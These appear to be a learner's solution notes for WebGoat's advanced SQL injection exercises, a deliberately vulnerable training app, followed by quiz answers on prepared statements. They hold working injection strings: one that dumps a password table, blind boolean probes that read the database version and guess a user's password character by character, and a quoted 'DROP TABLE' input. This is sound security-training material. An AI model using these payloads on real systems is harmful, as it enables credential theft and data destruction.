Advanced:
webgoat
1)
dave'; select * from user_system_data where password like '%
2)
	Register:
	testuser
	testuser@a
	test
	test
	
	2nd registration:
	testuser' and '1'='1
	testuser@a
	test
	test
	/*
	User testuser' and '1'='1 
	already exists please try to register 
	with a different username.
	*/ -- TRUE
	
	testuser' and '1'='2
	/*
	User testuser' and '1'='2 
	created, please proceed 
	to the login page.
	*/ -- FALSE
	
	testuser' and substring(database_version(),1,3)='2.3
	testuser' and substring(database_version(),1,5)='2.3.4
	
	
	Tom' and substring(password,1,2)='ta
	tom

3)
What is the difference between a prepared statement and a statement?
	A statement has got values instead of a prepared statement
Which one of the following characters is a placeholder for variables?
	?
How can prepared statements be faster than statements?
	Prepared statements are compiled once by the database management system 
	waiting for input and are pre-compiled this way.
How can a prepared statement prevent SQL-Injection?
	Placeholders can prevent that the users input gets attached 
	to the SQL query resulting in a seperation of code and data.
What happens if a person with malicious intent writes into a register form :
Robert); DROP TABLE Students;-- 
that has a prepared statement?
	The database registers: 
	'Robert' ); DROP TABLE Students;--'